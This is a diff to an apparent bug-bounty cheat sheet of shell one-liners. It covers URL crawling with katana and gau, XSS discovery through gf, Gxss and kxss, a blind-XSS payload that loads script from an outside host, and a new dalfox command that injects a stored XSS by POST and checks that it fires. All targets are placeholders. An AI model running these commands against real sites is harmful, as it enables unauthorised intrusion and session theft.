@@ -40,7 +40,7 @@ cat nowaf_subs_domain.com.txt | grep 403 | awk '{print $1}'
 
 Search links
 --------------------------------------
-katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive, commoncrawl, alienvault -hf -jc -fx -ef woff, css, png, svg, jpg, woff2, jpeg, gif, svg -o allurls.txt
+katana -u www.target.com.br -v -d 3 -fx -aff -jc -kf -iqp -ef woff, css, png, svg, jpg, woff2, jpeg, gif, svg | tee > allurlspref.txt
 katana -u www.target.com.br -v -d 5 -ef woff, css, png, svg, jpg, woff2, jpeg, gif, svg -o allurlspref.txt
 
 cat alive.txt | gau --threads 100 > gau.txt
@@ -87,6 +87,11 @@ katana -ps -f qurl | gf xss | bxss -appendMode -payload "<script src=https://xss
 echo target.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
 cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/ | sort -u > final.txt
 python loxs.py
+
+>>example 3
+send POST request to Store the XSS payload and verify it working of the payload with an GET request
+dalfox sxss -X POST https://target.com/update_profile -d "login=admin" --trigger "https://target.com/my_profile" --request-method GET
+
 
 SQLi
 -------------
